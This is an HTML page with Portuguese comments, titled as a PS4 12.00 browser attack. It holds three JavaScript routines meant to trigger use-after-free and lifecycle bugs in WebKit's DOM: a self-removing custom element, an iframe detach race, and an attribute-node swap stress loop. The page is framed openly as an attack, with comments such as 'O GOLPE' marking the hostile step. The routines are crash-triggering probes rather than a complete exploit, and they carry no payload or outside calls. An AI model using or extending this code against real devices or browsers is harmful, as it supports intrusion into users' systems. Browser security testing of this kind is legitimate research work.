<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 12.00 Lifecycle Killer</title>
    <style>
        body { background-color: #000; color: #fff; font-family: monospace; padding: 20px; }
        button { 
            background: #fff; color: #000; border: 1px solid #333; 
            padding: 20px; width: 100%; margin-bottom: 15px; 
            font-size: 18px; font-weight: bold; cursor: pointer; text-align: left;
        }
        button:hover { background: #ccc; }
        #log { border-top: 1px solid #fff; padding-top: 10px; margin-top: 20px; white-space: pre-wrap; }
    </style>
</head>
<body>

    <h1>OBJECT LIFECYCLE ATTACKS</h1>
    <p>Target: WebCore DOM State Machine (Custom Elements / Frames)</p>

    <button onclick="runCustomElementUAF()">TEST 1: Custom Element Suicide (UAF)</button>
    <button onclick="runFrameDetach()">TEST 2: Iframe Detach Race</button>
    <button onclick="runAttributeConfusion()">TEST 3: Attribute Node Confusion</button>
    
    <div id="container"></div>
    <div id="log">Status: Aguardando...</div>

    <script>
        function log(msg) { 
            document.getElementById('log').innerText = `> ${msg}\n` + document.getElementById('log').innerText;
        }

        // --- TESTE 1: Custom Element Suicide ---
        // Cria um elemento que se deleta da memória ASSIM que o navegador tenta renderizá-lo.
        // O motor C++ pode tentar acessar o ponteiro deletado logo em seguida.
        function runCustomElementUAF() {
            log("Iniciando Custom Element Attack...");
            
            try {
                // Define um elemento "Maligno"
                if (!customElements.get('x-suicide')) {
                    class SuicideElement extends HTMLElement {
                        connectedCallback() {
                            // O GOLPE: O C++ acabou de nos conectar.
                            // Nós nos desconectamos imediatamente.
                            this.remove();
                            
                            // Agora tentamos forçar o C++ a usar o ponteiro "dangling"
                            // acessando propriedades que exigem layout.
                            try {
                                this.innerHTML = "<b>CRASH</b>";
                                const x = this.offsetWidth; 
                                this.setAttribute("id", "dead");
                            } catch(e) {}
                        }
                    }
                    customElements.define('x-suicide', SuicideElement);
                }

                // Criação em massa para tentar acertar o timing do Garbage Collector
                const container = document.getElementById('container');
                let count = 0;
                const interval = setInterval(() => {
                    count++;
                    const el = document.createElement('x-suicide');
                    container.appendChild(el); // Dispara connectedCallback
                    
                    if(count > 1000) {
                        clearInterval(interval);
                        log("Teste 1 finalizado (Sem Crash Imediato).");
                    }
                }, 1);

            } catch(e) { log("Erro: " + e.message); }
        }

        // --- TESTE 2: Iframe Detach Race ---
        // Tenta acessar o objeto 'window' de um Iframe NO MOMENTO em que ele está sendo destruído.
        // Clássico bug de segurança de navegadores.
        function runFrameDetach() {
            log("Iniciando Iframe Detach Race...");
            
            const frame = document.createElement('iframe');
            document.body.appendChild(frame);
            
            // Prepara o ataque quando o frame carregar
            frame.onload = function() {
                const win = frame.contentWindow;
                const doc = frame.contentDocument;
                
                // Define um evento que roda durante a destruição
                win.onunload = function() {
                    // O frame está morrendo. Tenta manter uma referência viva.
                    log("Frame unloading... acessando objetos mortos.");
                    try {
                        doc.body.innerHTML = "X";
                        win.location.href = "about:blank";
                    } catch(e) {}
                };
                
                // O GOLPE: Remove o frame (Dispara unload)
                setTimeout(() => {
                    document.body.removeChild(frame);
                    // Tenta acessar a referência 'win' que deveria estar morta
                    try {
                        const zombie = win.document;
                    } catch(e) {}
                }, 100);
            };
            
            frame.src = "about:blank";
        }

        // --- TESTE 3: Attribute Node Confusion ---
        // Manipula nós de Atributos (que são raros de usar manualmente).
        // Tenta compartilhar o mesmo nó de atributo entre dois elementos diferentes.
        function runAttributeConfusion() {
            log("Iniciando Attribute Confusion...");
            
            try {
                const el1 = document.createElement('div');
                const el2 = document.createElement('div');
                
                const attr = document.createAttribute('data-hack');
                attr.value = "payload";
                
                el1.setAttributeNode(attr);
                
                // Tenta mover o atributo para outro elemento enquanto o primeiro ainda o usa
                // Isso pode confundir a contagem de referência (RefCount) no C++
                el2.setAttributeNode(attr); // O WebKit deve remover de el1 automaticamente
                
                // Tenta acessar de volta no el1 (que deveria ter perdido o atributo)
                if (el1.getAttribute('data-hack') === "payload") {
                    log("Alerta Lógico: Atributo duplicado detectado!");
                }
                
                // Estressa essa troca
                for(let i=0; i<5000; i++) {
                    el1.setAttributeNode(attr);
                    el2.setAttributeNode(attr);
                }
                
                log("Teste 3 finalizado.");
                
            } catch(e) { 
                // Erros de "InUseAttributeError" são esperados se o navegador for seguro
                log("Browser bloqueou a troca (Seguro): " + e.message); 
            }
        }

    </script>
</body>
</html>
